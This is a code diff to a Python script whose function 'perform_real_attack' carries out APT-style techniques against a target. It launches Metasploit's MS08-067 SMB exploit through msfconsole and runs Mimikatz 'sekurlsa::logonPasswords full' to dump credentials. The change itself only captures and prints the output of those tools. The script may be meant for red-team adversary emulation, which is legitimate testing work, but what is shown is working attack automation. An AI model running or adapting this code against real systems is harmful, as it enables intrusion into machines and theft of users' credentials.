@@ -103,31 +103,39 @@ def perform_real_attack(apt_group, techniques):
         elif "Exploitation of Vulnerability" in technique:
             # Exploit a vulnerability (e.g., MS08-067 for SMB)
             print("[INFO] Running Metasploit for MS08-067 SMB exploit.")
-            run_metasploit_exploit('windows/smb/ms08_067_netapi', 'RHOST', '<target_ip>')
+            output = run_metasploit_exploit('windows/smb/ms08_067_netapi', 'RHOST', '<target_ip>')
+            print(f"[INFO] Exploit output: {output}")
         elif "Credential Dumping" in technique:
             # Use Mimikatz to dump credentials
             print("[INFO] Running Mimikatz for credential dumping.")
-            run_mimikatz()
+            output = run_mimikatz()
+            print(f"[INFO] Mimikatz output: {output}")
         else:
             print(f"[INFO] No specific action for technique: {technique}")
 
-# Running Metasploit Exploit
+# Running Metasploit Exploit and capturing the output
 def run_metasploit_exploit(exploit_name, option_name, option_value):
     try:
         print(f"[INFO] Running Metasploit exploit: {exploit_name}")
         msf_command = f"msfconsole -x 'use {exploit_name}; set {option_name} {option_value}; run'"
-        subprocess.run(msf_command, shell=True, check=True)
+        result = subprocess.run(msf_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = result.stdout.decode() + "\n" + result.stderr.decode()
+        return output
     except subprocess.CalledProcessError as e:
         print(f"[ERROR] Error running Metasploit: {e}")
+        return str(e)
 
-# Running Mimikatz for Credential Dumping
+# Running Mimikatz for Credential Dumping and capturing the output
 def run_mimikatz():
     try:
         print("[INFO] Running Mimikatz...")
         mimikatz_command = "mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords full'"
-        subprocess.run(mimikatz_command, shell=True, check=True)
+        result = subprocess.run(mimikatz_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = result.stdout.decode() + "\n" + result.stderr.decode()
+        return output
     except subprocess.CalledProcessError as e:
         print(f"[ERROR] Error running Mimikatz: {e}")
+        return str(e)
 
 # Main function to run the attack simulation or real attack
 def run_attack():
